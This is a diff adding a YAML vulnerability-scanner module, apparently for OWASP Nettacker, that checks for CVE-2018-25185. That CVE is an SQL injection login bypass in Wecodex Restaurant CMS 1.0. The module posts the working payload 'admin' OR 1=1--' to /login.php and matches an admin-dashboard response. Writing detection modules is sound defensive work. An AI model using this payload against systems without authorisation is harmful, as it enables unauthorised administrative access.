@@ -1,0 +1,47 @@
+info:
+  name: cve_2018_25185_sqli
+  author: Gopika
+  severity: 8
+  description: SQL Injection vulnerability in Wecodex Restaurant CMS 1.0 via username parameter in /login.php allowing authentication bypass.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-25185
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve2018
+    - cve
+    - sqli
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/login.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 8080
+        data:
+          "username=admin' OR 1=1--&password=test"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "Welcome admin dashboard"
+              reverse: false
